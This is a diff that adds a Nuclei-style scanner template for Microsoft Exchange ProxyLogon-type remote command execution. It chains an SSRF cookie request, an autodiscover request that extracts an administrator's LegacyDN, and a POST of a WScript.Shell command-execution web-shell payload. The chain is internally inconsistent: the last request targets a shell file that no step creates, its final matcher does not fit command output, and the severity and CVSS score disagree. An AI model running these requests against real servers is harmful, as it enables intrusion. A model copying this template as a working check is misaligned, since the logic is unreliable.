@@ -1,0 +1,96 @@
+id: cve-2021-26857-26858
+
+info:
+  name: Microsoft Exchange Server Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Microsoft Exchange Server is vulnerable to remote command execution, allowing attackers to arbitrarily execute code, write backdoors, and control the web server.
+  reference:
+    - https://github.com/sirpedrotavares/Proxylogon-exploit
+  classification:
+    cve-id:
+      - CVE-2021-26857
+      - CVE-2021-26858
+    cvss-score: 7.8
+
+variables:
+  random_name: "{{rand_base(4)}}.js"
+  email: "administrator@victim.corp"
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "/ecp/{{random_name}}"
+    headers:
+      Cookie: "X-BEResource=localhost~1942062522"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-FEServer"
+      - type: word
+        part: body
+        words:
+          - "NegotiateSecurityContext failed with for host 'localhost' with status 'TargetUnknown'"
+    extractors:
+      - type: regex
+        part: header
+        name: fqdn
+        regex:
+          - "X-FEServer: ([^\r\n]+)"
+        internal: true
+
+  - id: autodiscover-request
+    method: POST
+    path:
+      - "/ecp/{{random_name}}"
+    headers:
+      Cookie: "X-BEResource={{fqdn}}/autodiscover/autodiscover.xml?a=~1942062522"
+      Content-Type: "text/xml"
+    body: |
+      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+        <Request>
+          <EMailAddress>{{email}}</EMailAddress>
+          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+        </Request>
+      </Autodiscover>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<LegacyDN>"
+    extractors:
+      - type: regex
+        part: body
+        name: legacy_dn
+        regex:
+          - "<LegacyDN>([^<]+)</LegacyDN>"
+        internal: true
+
+  - id: shell-verification
+    method: POST
+    path:
+      - "/owa/auth/{{rand_base(4)}}.aspx"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "request=Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"{{cmd}}\").stdout.readall())"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "act as owner of a UserMailbox"
